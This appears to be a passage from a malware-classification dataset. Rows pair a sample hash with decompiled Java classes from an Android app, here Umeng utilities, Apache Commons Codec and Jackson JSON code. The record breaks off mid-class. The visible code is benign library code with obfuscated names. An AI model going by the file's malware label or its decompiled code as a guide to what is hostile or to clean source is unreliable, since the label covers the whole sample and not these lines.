"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\g.code","public class g {   public static final int a=448;   public static final int b=256;   public static final int c=128;   public static final int d=64;   public static final int e=56;   public static final int f=32;   public static final int g=16;   public static final int h=8;   public static final int i=7;   public static final int j=4;   public static final int k=2;   public static final int l=1; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\h.code","public class h {   public static final String a=System.getProperty(""line.separator"");   private static final String b=""helper"";   public static String a(  String str){     if (str == null) {       return null;     }     try {       byte[] bytes=str.getBytes();       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       messageDigest.reset();       messageDigest.update(bytes);       byte[] digest=messageDigest.digest();       StringBuffer stringBuffer=new StringBuffer();       for (      byte b2 : digest) {         stringBuffer.append(String.format(""%02X"",Byte.valueOf(b2)));       }       return stringBuffer.toString();     }  catch (    Exception e) {       return str.replaceAll(""[^[a-z][A-Z][0-9][.][_]]"","""");     }   }   public static String b(  String str){     try {       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       messageDigest.update(str.getBytes());       byte[] digest=messageDigest.digest();       StringBuffer stringBuffer=new StringBuffer();       for (      byte b2 : digest) {         stringBuffer.append(Integer.toHexString(b2 & 255));       }       return stringBuffer.toString();     }  catch (    NoSuchAlgorithmException e) {       Log.a(b,""getMD5 error"",e);       return """";     }   }   public static String a(  File file){     byte[] bArr=new byte[1024];     try {       if (!file.isFile()) {         return """";       }       MessageDigest messageDigest=MessageDigest.getInstance(""MD5"");       FileInputStream fileInputStream=new FileInputStream(file);       while (true) {         int read=fileInputStream.read(bArr,0,1024);         if (read != -1) {           messageDigest.update(bArr,0,read);         }  else {           fileInputStream.close();           return String.format(""%1$032x"",new BigInteger(1,messageDigest.digest()));         }       }     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public static String a(  Context context,  long j){     if (j < 1000) {       return ((int)j) + ""B"";     }     if (j < 1000000) {       return Math.round(((float)j) / 1000.0d) + ""K"";     }     if (j < 1000000000) {       return new DecimalFormat(""#0.0"").format(((float)j) / 1000000.0d) + ""M"";     }     return new DecimalFormat(""#0.00"").format(((float)j) / 1.0E9d) + ""G"";   }   public static String c(  String str){     try {       long longValue=Long.valueOf(str).longValue();       if (longValue < 1024) {         return ((int)longValue) + ""B"";       }       if (longValue < 1048576) {         return new DecimalFormat(""#0.00"").format(((float)longValue) / 1024.0d) + ""K"";       }       if (longValue < 1073741824) {         return new DecimalFormat(""#0.00"").format(((float)longValue) / 1048576.0d) + ""M"";       }       return new DecimalFormat(""#0.00"").format(((float)longValue) / 1.073741824E9d) + ""G"";     }  catch (    NumberFormatException e) {       return str;     }   }   public static void a(  Context context,  String str){     context.startActivity(context.getPackageManager().getLaunchIntentForPackage(str));   }   public static boolean b(  Context context,  String str){     try {       context.startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str)));       return true;     }  catch (    Exception e) {       e.printStackTrace();       return false;     }   }   public static boolean d(  String str){     return str == null || str.length() == 0;   }   public static boolean e(  String str){     if (d(str)) {       return false;     }     String lowerCase=str.trim().toLowerCase();     return lowerCase.startsWith(""http://"") || lowerCase.startsWith(""https://"");   }   public static String a(){     return a(new Date());   }   public static String a(  Date date){     if (date == null) {       return """";     }     return new SimpleDateFormat(""yyyy-MM-dd HH:mm:ss"",Locale.US).format(date);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\i.code","public class i {   public static String a(  Map<String,Object> map,  String str){     if (map != null && !map.isEmpty()) {       StringBuilder sb=new StringBuilder(str);       Set<String> keySet=map.keySet();       if (!str.endsWith(""?"")) {         sb.append(""?"");       }       for (      String str2 : keySet) {         sb.append(URLEncoder.encode(str2) + ""="" + URLEncoder.encode(map.get(str2) == null ? """" : map.get(str2).toString())+ ""&"");       }       sb.deleteCharAt(sb.length() - 1);       return sb.toString();     }     return str;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\j.code","public class j {   protected Context a;   protected Notification b=new Notification();   protected Notification.Builder c;   public j(  Context context){     this.a=context.getApplicationContext();     if (Build.VERSION.SDK_INT >= 14) {       this.c=new Notification.Builder(context);     }   }   public void e(){     if (Build.VERSION.SDK_INT >= 16) {       try {         Field declaredField=Notification.Builder.class.getDeclaredField(""mActions"");         declaredField.setAccessible(true);         declaredField.set(this.c,declaredField.get(this.c).getClass().newInstance());       }  catch (      Exception e) {       }     }   }   public j b(  RemoteViews remoteViews){     if (Build.VERSION.SDK_INT < 16 && Build.VERSION.SDK_INT >= 14) {       this.c.setContent(remoteViews);     }     this.b.contentView=remoteViews;     return this;   }   public j a(  PendingIntent pendingIntent){     if (Build.VERSION.SDK_INT >= 14) {       this.c.setContentIntent(pendingIntent);     }     this.b.contentIntent=pendingIntent;     return this;   }   public j a(  boolean z){     if (Build.VERSION.SDK_INT >= 14) {       this.c.setOngoing(z);     }     if (z) {       this.b.flags|=2;     }  else {       this.b.flags&=-3;     }     return this;   }   public j b(  boolean z){     if (Build.VERSION.SDK_INT >= 14) {       this.c.setAutoCancel(z);     }     if (z) {       this.b.flags|=16;     }  else {       this.b.flags&=-17;     }     return this;   }   public j a(  int i){     if (Build.VERSION.SDK_INT >= 14) {       this.c.setSmallIcon(i);     }     this.b.icon=i;     return this;   }   public j c(  CharSequence charSequence){     if (Build.VERSION.SDK_INT >= 14) {       this.c.setTicker(charSequence);     }     this.b.tickerText=charSequence;     return this;   }   public j a(  long j){     if (Build.VERSION.SDK_INT >= 14) {       this.c.setWhen(j);     }     this.b.when=j;     return this;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\com.umeng.common.util\k.code","public class k {   private static float a=1.0f;   public k(  Context context){     a(context);   }   public static void a(  Context context){     a=context.getResources().getDisplayMetrics().density;   }   public static int a(  float f){     return (int)((a * f) + 0.5f);   }   public static int b(  float f){     return (int)((f / a) + 0.5f);   }   public static int c(  float f){     return (int)((a * f) + 0.5f);   }   public static int d(  float f){     return (int)((f / a) + 0.5f);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.apache.commons.codec\BinaryDecoder.code","public interface BinaryDecoder extends Decoder {   byte[] decode(  byte[] bArr) throws DecoderException ; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.apache.commons.codec\BinaryEncoder.code","public interface BinaryEncoder extends Encoder {   byte[] encode(  byte[] bArr) throws EncoderException ; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.apache.commons.codec\CharEncoding.code","public class CharEncoding {   public static final String ISO_8859_1=""ISO-8859-1"";   public static final String US_ASCII=""US-ASCII"";   public static final String UTF_16=""UTF-16"";   public static final String UTF_16BE=""UTF-16BE"";   public static final String UTF_16LE=""UTF-16LE"";   public static final String UTF_8=""UTF-8""; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.apache.commons.codec\Decoder.code","public interface Decoder {   Object decode(  Object obj) throws DecoderException ; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.apache.commons.codec\DecoderException.code","public class DecoderException extends Exception {   private static final long serialVersionUID=1;   public DecoderException(){   }   public DecoderException(  String message){     super(message);   }   public DecoderException(  String message,  Throwable cause){     super(message,cause);   }   public DecoderException(  Throwable cause){     super(cause);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.apache.commons.codec\Encoder.code","public interface Encoder {   Object encode(  Object obj) throws EncoderException ; } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.apache.commons.codec\EncoderException.code","public class EncoderException extends Exception {   private static final long serialVersionUID=1;   public EncoderException(){   }   public EncoderException(  String message){     super(message);   }   public EncoderException(  String message,  Throwable cause){     super(message,cause);   }   public EncoderException(  Throwable cause){     super(cause);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.apache.commons.codec.binary\Base64.code","!org.eclipse.jdt.core.dom.TypeDeclaration@321c3812"
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.apache.commons.codec.binary\Hex.code","public class Hex implements BinaryEncoder, BinaryDecoder {   public static final String DEFAULT_CHARSET_NAME=""UTF-8"";   private static final char[] DIGITS_LOWER={'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'};   private static final char[] DIGITS_UPPER={'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};   private final String charsetName;   public static byte[] decodeHex(  char[] data) throws DecoderException {     int len=data.length;     if ((len & 1) != 0) {       throw new DecoderException(""Odd number of characters."");     }     byte[] out=new byte[len >> 1];     int i=0;     int j=0;     while (j < len) {       int f=toDigit(data[j],j) << 4;       int j2=j + 1;       int f2=f | toDigit(data[j2],j2);       j=j2 + 1;       out[i]=(byte)(f2 & FruitNinjiaGL1Activity.ACTION_MASK);       i++;     }     return out;   }   public static char[] encodeHex(  byte[] data){     return encodeHex(data,true);   }   public static char[] encodeHex(  byte[] data,  boolean toLowerCase){     return encodeHex(data,toLowerCase ? DIGITS_LOWER : DIGITS_UPPER);   }   protected static char[] encodeHex(  byte[] data,  char[] toDigits){     int l=data.length;     char[] out=new char[l << 1];     int j=0;     for (int i=0; i < l; i++) {       int j2=j + 1;       out[j]=toDigits[(data[i] & 240) >>> 4];       j=j2 + 1;       out[j2]=toDigits[data[i] & 15];     }     return out;   }   public static String encodeHexString(  byte[] data){     return new String(encodeHex(data));   }   protected static int toDigit(  char ch,  int index) throws DecoderException {     int digit=Character.digit(ch,16);     if (digit == -1) {       throw new DecoderException(""Illegal hexadecimal charcter "" + ch + "" at index ""+ index);     }     return digit;   }   public Hex(){     this.charsetName=""UTF-8"";   }   public Hex(  String csName){     this.charsetName=csName;   }   @Override public byte[] decode(  byte[] array) throws DecoderException {     try {       return decodeHex(new String(array,getCharsetName()).toCharArray());     }  catch (    UnsupportedEncodingException e) {       throw new DecoderException(e.getMessage(),e);     }   }   @Override public Object decode(  Object object) throws DecoderException {     try {       char[] charArray=object instanceof String ? ((String)object).toCharArray() : (char[])object;       return decodeHex(charArray);     }  catch (    ClassCastException e) {       throw new DecoderException(e.getMessage(),e);     }   }   @Override public byte[] encode(  byte[] array){     return StringUtils.getBytesUnchecked(encodeHexString(array),getCharsetName());   }   @Override public Object encode(  Object object) throws EncoderException {     try {       byte[] byteArray=object instanceof String ? ((String)object).getBytes(getCharsetName()) : (byte[])object;       return encodeHex(byteArray);     }  catch (    UnsupportedEncodingException e) {       throw new EncoderException(e.getMessage(),e);     } catch (    ClassCastException e2) {       throw new EncoderException(e2.getMessage(),e2);     }   }   public String getCharsetName(){     return this.charsetName;   }   public String toString(){     return String.valueOf(super.toString()) + ""[charsetName="" + this.charsetName+ ""]"";   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.apache.commons.codec.binary\StringUtils.code","public class StringUtils {   public static byte[] getBytesIso8859_1(  String string){     return getBytesUnchecked(string,""ISO-8859-1"");   }   public static byte[] getBytesUsAscii(  String string){     return getBytesUnchecked(string,""US-ASCII"");   }   public static byte[] getBytesUtf16(  String string){     return getBytesUnchecked(string,""UTF-16"");   }   public static byte[] getBytesUtf16Be(  String string){     return getBytesUnchecked(string,""UTF-16BE"");   }   public static byte[] getBytesUtf16Le(  String string){     return getBytesUnchecked(string,""UTF-16LE"");   }   public static byte[] getBytesUtf8(  String string){     return getBytesUnchecked(string,""UTF-8"");   }   public static byte[] getBytesUnchecked(  String string,  String charsetName){     if (string == null) {       return null;     }     try {       return string.getBytes(charsetName);     }  catch (    UnsupportedEncodingException e) {       throw newIllegalStateException(charsetName,e);     }   }   private static IllegalStateException newIllegalStateException(  String charsetName,  UnsupportedEncodingException e){     return new IllegalStateException(String.valueOf(charsetName) + "": "" + e);   }   public static String newString(  byte[] bytes,  String charsetName){     if (bytes == null) {       return null;     }     try {       return new String(bytes,charsetName);     }  catch (    UnsupportedEncodingException e) {       throw newIllegalStateException(charsetName,e);     }   }   public static String newStringIso8859_1(  byte[] bytes){     return newString(bytes,""ISO-8859-1"");   }   public static String newStringUsAscii(  byte[] bytes){     return newString(bytes,""US-ASCII"");   }   public static String newStringUtf16(  byte[] bytes){     return newString(bytes,""UTF-16"");   }   public static String newStringUtf16Be(  byte[] bytes){     return newString(bytes,""UTF-16BE"");   }   public static String newStringUtf16Le(  byte[] bytes){     return newString(bytes,""UTF-16LE"");   }   public static String newStringUtf8(  byte[] bytes){     return newString(bytes,""UTF-8"");   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\Base64Variant.code","public final class Base64Variant {   public static final int BASE64_VALUE_INVALID=-1;   public static final int BASE64_VALUE_PADDING=-2;   static final char PADDING_CHAR_NONE=0;   private final int[] _asciiToBase64;   private final byte[] _base64ToAsciiB;   private final char[] _base64ToAsciiC;   final int _maxLineLength;   final String _name;   final char _paddingChar;   final boolean _usesPadding;   public Base64Variant(  String name,  String base64Alphabet,  boolean usesPadding,  char paddingChar,  int maxLineLength){     this._asciiToBase64=new int[g.c];     this._base64ToAsciiC=new char[64];     this._base64ToAsciiB=new byte[64];     this._name=name;     this._usesPadding=usesPadding;     this._paddingChar=paddingChar;     this._maxLineLength=maxLineLength;     int alphaLen=base64Alphabet.length();     if (alphaLen != 64) {       throw new IllegalArgumentException(""Base64Alphabet length must be exactly 64 (was "" + alphaLen + "")"");     }     base64Alphabet.getChars(0,alphaLen,this._base64ToAsciiC,0);     Arrays.fill(this._asciiToBase64,-1);     for (int i=0; i < alphaLen; i++) {       char alpha=this._base64ToAsciiC[i];       this._base64ToAsciiB[i]=(byte)alpha;       this._asciiToBase64[alpha]=i;     }     if (usesPadding) {       this._asciiToBase64[paddingChar]=-2;     }   }   public Base64Variant(  Base64Variant base,  String name,  int maxLineLength){     this(base,name,base._usesPadding,base._paddingChar,maxLineLength);   }   public Base64Variant(  Base64Variant base,  String name,  boolean usesPadding,  char paddingChar,  int maxLineLength){     this._asciiToBase64=new int[g.c];     this._base64ToAsciiC=new char[64];     this._base64ToAsciiB=new byte[64];     this._name=name;     byte[] srcB=base._base64ToAsciiB;     System.arraycopy(srcB,0,this._base64ToAsciiB,0,srcB.length);     char[] srcC=base._base64ToAsciiC;     System.arraycopy(srcC,0,this._base64ToAsciiC,0,srcC.length);     int[] srcV=base._asciiToBase64;     System.arraycopy(srcV,0,this._asciiToBase64,0,srcV.length);     this._usesPadding=usesPadding;     this._paddingChar=paddingChar;     this._maxLineLength=maxLineLength;   }   public String getName(){     return this._name;   }   public boolean usesPadding(){     return this._usesPadding;   }   public boolean usesPaddingChar(  char c){     return c == this._paddingChar;   }   public boolean usesPaddingChar(  int ch){     return ch == this._paddingChar;   }   public char getPaddingChar(){     return this._paddingChar;   }   public byte getPaddingByte(){     return (byte)this._paddingChar;   }   public int getMaxLineLength(){     return this._maxLineLength;   }   public int decodeBase64Char(  char c){     if (c <= 127) {       return this._asciiToBase64[c];     }     return -1;   }   public int decodeBase64Char(  int ch){     if (ch <= 127) {       return this._asciiToBase64[ch];     }     return -1;   }   public int decodeBase64Byte(  byte b){     if (b <= Byte.MAX_VALUE) {       return this._asciiToBase64[b];     }     return -1;   }   public char encodeBase64BitsAsChar(  int value){     return this._base64ToAsciiC[value];   }   public int encodeBase64Chunk(  int b24,  char[] buffer,  int ptr){     int ptr2=ptr + 1;     buffer[ptr]=this._base64ToAsciiC[(b24 >> 18) & 63];     int ptr3=ptr2 + 1;     buffer[ptr2]=this._base64ToAsciiC[(b24 >> 12) & 63];     int ptr4=ptr3 + 1;     buffer[ptr3]=this._base64ToAsciiC[(b24 >> 6) & 63];     int ptr5=ptr4 + 1;     buffer[ptr4]=this._base64ToAsciiC[b24 & 63];     return ptr5;   }   public void encodeBase64Chunk(  StringBuilder sb,  int b24){     sb.append(this._base64ToAsciiC[(b24 >> 18) & 63]);     sb.append(this._base64ToAsciiC[(b24 >> 12) & 63]);     sb.append(this._base64ToAsciiC[(b24 >> 6) & 63]);     sb.append(this._base64ToAsciiC[b24 & 63]);   }   public int encodeBase64Partial(  int bits,  int outputBytes,  char[] buffer,  int outPtr){     int outPtr2=outPtr + 1;     buffer[outPtr]=this._base64ToAsciiC[(bits >> 18) & 63];     int outPtr3=outPtr2 + 1;     buffer[outPtr2]=this._base64ToAsciiC[(bits >> 12) & 63];     if (this._usesPadding) {       int outPtr4=outPtr3 + 1;       buffer[outPtr3]=outputBytes == 2 ? this._base64ToAsciiC[(bits >> 6) & 63] : this._paddingChar;       int outPtr5=outPtr4 + 1;       buffer[outPtr4]=this._paddingChar;       return outPtr5;     }     if (outputBytes == 2) {       int outPtr6=outPtr3 + 1;       buffer[outPtr3]=this._base64ToAsciiC[(bits >> 6) & 63];       return outPtr6;     }     return outPtr3;   }   public void encodeBase64Partial(  StringBuilder sb,  int bits,  int outputBytes){     sb.append(this._base64ToAsciiC[(bits >> 18) & 63]);     sb.append(this._base64ToAsciiC[(bits >> 12) & 63]);     if (this._usesPadding) {       sb.append(outputBytes == 2 ? this._base64ToAsciiC[(bits >> 6) & 63] : this._paddingChar);       sb.append(this._paddingChar);     }  else     if (outputBytes == 2) {       sb.append(this._base64ToAsciiC[(bits >> 6) & 63]);     }   }   public byte encodeBase64BitsAsByte(  int value){     return this._base64ToAsciiB[value];   }   public int encodeBase64Chunk(  int b24,  byte[] buffer,  int ptr){     int ptr2=ptr + 1;     buffer[ptr]=this._base64ToAsciiB[(b24 >> 18) & 63];     int ptr3=ptr2 + 1;     buffer[ptr2]=this._base64ToAsciiB[(b24 >> 12) & 63];     int ptr4=ptr3 + 1;     buffer[ptr3]=this._base64ToAsciiB[(b24 >> 6) & 63];     int ptr5=ptr4 + 1;     buffer[ptr4]=this._base64ToAsciiB[b24 & 63];     return ptr5;   }   public int encodeBase64Partial(  int bits,  int outputBytes,  byte[] buffer,  int outPtr){     int outPtr2=outPtr + 1;     buffer[outPtr]=this._base64ToAsciiB[(bits >> 18) & 63];     int outPtr3=outPtr2 + 1;     buffer[outPtr2]=this._base64ToAsciiB[(bits >> 12) & 63];     if (this._usesPadding) {       byte pb=(byte)this._paddingChar;       int outPtr4=outPtr3 + 1;       buffer[outPtr3]=outputBytes == 2 ? this._base64ToAsciiB[(bits >> 6) & 63] : pb;       int outPtr5=outPtr4 + 1;       buffer[outPtr4]=pb;       return outPtr5;     }     if (outputBytes == 2) {       int outPtr6=outPtr3 + 1;       buffer[outPtr3]=this._base64ToAsciiB[(bits >> 6) & 63];       return outPtr6;     }     return outPtr3;   }   public String toString(){     return this._name;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\Base64Variants.code","public final class Base64Variants {   public static final Base64Variant MODIFIED_FOR_URL;   static final String STD_BASE64_ALPHABET=""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"";   public static final Base64Variant MIME=new Base64Variant(""MIME"",STD_BASE64_ALPHABET,true,'=',76);   public static final Base64Variant MIME_NO_LINEFEEDS=new Base64Variant(MIME,""MIME-NO-LINEFEEDS"",Integer.MAX_VALUE);   public static final Base64Variant PEM=new Base64Variant(MIME,""PEM"",true,'=',64); static {     StringBuffer sb=new StringBuffer(STD_BASE64_ALPHABET);     sb.setCharAt(sb.indexOf(""+""),'-');     sb.setCharAt(sb.indexOf(""/""),'_');     MODIFIED_FOR_URL=new Base64Variant(""MODIFIED-FOR-URL"",sb.toString(),false,(char)0,Integer.MAX_VALUE);   }   public static Base64Variant getDefaultVariant(){     return MIME_NO_LINEFEEDS;   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\JsonFactory.code","public class JsonFactory {   protected int _generatorFeatures;   protected ObjectCodec _objectCodec;   protected int _parserFeatures;   protected BytesToNameCanonicalizer _rootByteSymbols;   protected CharsToNameCanonicalizer _rootCharSymbols;   static final int DEFAULT_PARSER_FEATURE_FLAGS=JsonParser.Feature.collectDefaults();   static final int DEFAULT_GENERATOR_FEATURE_FLAGS=JsonGenerator.Feature.collectDefaults();   static final ThreadLocal<SoftReference<BufferRecycler>> _recyclerRef=new ThreadLocal<>();   public JsonFactory(){     this(null);   }   public JsonFactory(  ObjectCodec oc){     this._rootCharSymbols=CharsToNameCanonicalizer.createRoot();     this._rootByteSymbols=BytesToNameCanonicalizer.createRoot();     this._parserFeatures=DEFAULT_PARSER_FEATURE_FLAGS;     this._generatorFeatures=DEFAULT_GENERATOR_FEATURE_FLAGS;     this._objectCodec=oc;   }   public final JsonFactory configure(  JsonParser.Feature f,  boolean state){     if (state) {       enable(f);     }  else {       disable(f);     }     return this;   }   public JsonFactory enable(  JsonParser.Feature f){     this._parserFeatures|=f.getMask();     return this;   }   public JsonFactory disable(  JsonParser.Feature f){     this._parserFeatures&=f.getMask() ^ (-1);     return this;   }   public final boolean isEnabled(  JsonParser.Feature f){     return (this._parserFeatures & f.getMask()) != 0;   }   public final void enableParserFeature(  JsonParser.Feature f){     enable(f);   }   public final void disableParserFeature(  JsonParser.Feature f){     disable(f);   }   public final void setParserFeature(  JsonParser.Feature f,  boolean state){     configure(f,state);   }   public final boolean isParserFeatureEnabled(  JsonParser.Feature f){     return (this._parserFeatures & f.getMask()) != 0;   }   public final JsonFactory configure(  JsonGenerator.Feature f,  boolean state){     if (state) {       enable(f);     }  else {       disable(f);     }     return this;   }   public JsonFactory enable(  JsonGenerator.Feature f){     this._generatorFeatures|=f.getMask();     return this;   }   public JsonFactory disable(  JsonGenerator.Feature f){     this._generatorFeatures&=f.getMask() ^ (-1);     return this;   }   public final boolean isEnabled(  JsonGenerator.Feature f){     return (this._generatorFeatures & f.getMask()) != 0;   }   public final void enableGeneratorFeature(  JsonGenerator.Feature f){     enable(f);   }   public final void disableGeneratorFeature(  JsonGenerator.Feature f){     disable(f);   }   public final void setGeneratorFeature(  JsonGenerator.Feature f,  boolean state){     configure(f,state);   }   public final boolean isGeneratorFeatureEnabled(  JsonGenerator.Feature f){     return isEnabled(f);   }   public JsonFactory setCodec(  ObjectCodec oc){     this._objectCodec=oc;     return this;   }   public ObjectCodec getCodec(){     return this._objectCodec;   }   public JsonParser createJsonParser(  File f) throws IOException, JsonParseException {     return _createJsonParser(new FileInputStream(f),_createContext(f,true));   }   public JsonParser createJsonParser(  URL url) throws IOException, JsonParseException {     return _createJsonParser(_optimizedStreamFromURL(url),_createContext(url,true));   }   public JsonParser createJsonParser(  InputStream in) throws IOException, JsonParseException {     return _createJsonParser(in,_createContext(in,false));   }   public JsonParser createJsonParser(  Reader r) throws IOException, JsonParseException {     return _createJsonParser(r,_createContext(r,false));   }   public JsonParser createJsonParser(  byte[] data) throws IOException, JsonParseException {     return _createJsonParser(data,0,data.length,_createContext(data,true));   }   public JsonParser createJsonParser(  byte[] data,  int offset,  int len) throws IOException, JsonParseException {     return _createJsonParser(data,offset,len,_createContext(data,true));   }   public JsonParser createJsonParser(  String content) throws IOException, JsonParseException {     Reader r=new StringReader(content);     return _createJsonParser(r,_createContext(r,true));   }   public JsonGenerator createJsonGenerator(  OutputStream out,  JsonEncoding enc) throws IOException {     IOContext ctxt=_createContext(out,false);     ctxt.setEncoding(enc);     return _createJsonGenerator(_createWriter(out,enc,ctxt),ctxt);   }   public JsonGenerator createJsonGenerator(  Writer out) throws IOException {     IOContext ctxt=_createContext(out,false);     return _createJsonGenerator(out,ctxt);   }   public JsonGenerator createJsonGenerator(  File f,  JsonEncoding enc) throws IOException {     OutputStream out=new FileOutputStream(f);     IOContext ctxt=_createContext(out,true);     ctxt.setEncoding(enc);     return _createJsonGenerator(_createWriter(out,enc,ctxt),ctxt);   }   protected IOContext _createContext(  Object srcRef,  boolean resourceManaged){     return new IOContext(_getBufferRecycler(),srcRef,resourceManaged);   }   protected JsonParser _createJsonParser(  InputStream in,  IOContext ctxt) throws IOException, JsonParseException {     return new ByteSourceBootstrapper(ctxt,in).constructParser(this._parserFeatures,this._objectCodec,this._rootByteSymbols,this._rootCharSymbols);   }   protected JsonParser _createJsonParser(  Reader r,  IOContext ctxt) throws IOException, JsonParseException {     return new ReaderBasedParser(ctxt,this._parserFeatures,r,this._objectCodec,this._rootCharSymbols.makeChild(isEnabled(JsonParser.Feature.CANONICALIZE_FIELD_NAMES),isEnabled(JsonParser.Feature.INTERN_FIELD_NAMES)));   }   protected JsonParser _createJsonParser(  byte[] data,  int offset,  int len,  IOContext ctxt) throws IOException, JsonParseException {     return new ByteSourceBootstrapper(ctxt,data,offset,len).constructParser(this._parserFeatures,this._objectCodec,this._rootByteSymbols,this._rootCharSymbols);   }   protected JsonGenerator _createJsonGenerator(  Writer out,  IOContext ctxt) throws IOException {     return new WriterBasedGenerator(ctxt,this._generatorFeatures,this._objectCodec,out);   }   public BufferRecycler _getBufferRecycler(){     SoftReference<BufferRecycler> ref=_recyclerRef.get();     BufferRecycler br=ref == null ? null : ref.get();     if (br == null) {       br=new BufferRecycler();       if (ref == null) {         _recyclerRef.set(new SoftReference<>(br));       }     }     return br;   }   protected InputStream _optimizedStreamFromURL(  URL url) throws IOException {     String host;     return (""file"".equals(url.getProtocol()) && ((host=url.getHost()) == null || host.length() == 0)) ? new FileInputStream(url.getPath()) : url.openStream();   }   protected Writer _createWriter(  OutputStream out,  JsonEncoding enc,  IOContext ctxt) throws IOException {     return enc == JsonEncoding.UTF8 ? new UTF8Writer(ctxt,out) : new OutputStreamWriter(out,enc.getJavaName());   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\JsonGenerationException.code","public class JsonGenerationException extends JsonProcessingException {   static final long serialVersionUID=123;   public JsonGenerationException(  Throwable rootCause){     super(rootCause);   }   public JsonGenerationException(  String msg){     super(msg,(JsonLocation)null);   }   public JsonGenerationException(  String msg,  Throwable rootCause){     super(msg,null,rootCause);   } } "
"msc_data/decompiled_malware_class/00076CF9D074F00DEA55AF490B9EE8766F8E98382F070AFF6A02D15954DC6C9D\org.codehaus.jackson\JsonGenerator.code","public abstract class JsonGenerator implements Closeable {   protected PrettyPrinter _cfgPrettyPrinter;   @Override public abstract void close() throws IOException ;   public abstract void copyCurrentEvent(  JsonParser jsonParser) throws IOException, JsonProcessingException ;   public abstract void copyCurrentStructure(  JsonParser jsonParser) throws IOException, JsonProcessingException ;   public abstract JsonGenerator disable(  Feature feature);   public abstract JsonGenerator enable(  Feature feature);   public abstract void flush() throws IOException ;   public abstract ObjectCodec getCodec();   public abstract JsonStreamContext getOutputContext();   public abstract boolean isClosed();   public abstract boolean isEnabled(  Feature feature);   public abstract JsonGenerator setCodec(  ObjectCodec objectCodec);   public abstract JsonGenerator useDefaultPrettyPrinter();   public abstract void writeBinary(  Base64Variant base64Variant,  byte[] bArr,  int i,  int i2) throws IOException, JsonGenerationException ;   public abstract void writeBoolean(  boolean z) throws IOException, JsonGenerationException ;   public abstract void writeEndArray() throws IOException, JsonGenerationException ;   public abstract void writeEndObject() throws IOException, JsonGenerationException ;   public abstract void writeFieldName(  String str) throws IOException, JsonGenerationException ;   public abstract void writeNull() throws IOException, JsonGenerationException ;   public abstract void writeNumber(  double d) throws IOException, JsonGenerationException ;   public abstract void writeNumber(  float f) throws IOException, JsonGenerationException ;   public abstract void writeNumber(  int i) throws IOException, JsonGenerationException ;   public abstract void writeNumber(  long j) throws IOException, JsonGenerationException ;   public abstract void writeNumber(  String str) throws IOException, JsonGenerationException, UnsupportedOperationException ;   public abstract void writeNumber(  BigDecimal bigDecimal) throws IOException, JsonGenerationException ;   public abstract void writeNumber(  BigInteger bigInteger) throws IOException, JsonGenerationException ;   public abstract void writeObject(  Object obj) throws IOException, JsonProcessingException ;   public abstract void writeRaw(  char c) throws IOException, JsonGenerationException ;   public abstract void writeRaw(  String str) throws IOException, JsonGenerationException ;   public abstract void writeRaw(  String str,  int i,  int i2) throws IOException, JsonGenerationException ;   public abstract void writeRaw(  char[] cArr,  int i,  int i2) throws IOException, JsonGenerationException ;   public abstract void writeRawValue(  String str) throws IOException, JsonGenerationException ;   public abstract void writeRawValue(  String str,  int i,  int i2) throws IOException, JsonGenerationException ;   public abstract void writeRawValue(  char[] cArr,  int i,  int i2) throws IOException, JsonGenerationException ;   public abstract void writeStartArray() throws IOException, JsonGenerationException ;   public abstract void writeStartObject() throws IOException, JsonGenerationException ;   public abstract void writeString(  String str) throws IOException, JsonGenerationException ;   public abstract void writeString(  char[] cArr,  int i,  int i2) throws IOException, JsonGenerationException ;   public abstract void writeTree(  JsonNode jsonNode) throws IOException, JsonProcessingException ;   public enum Feature {  AUTO_CLOSE_TARGET(true),   AUTO_CLOSE_JSON_CONTENT(true),   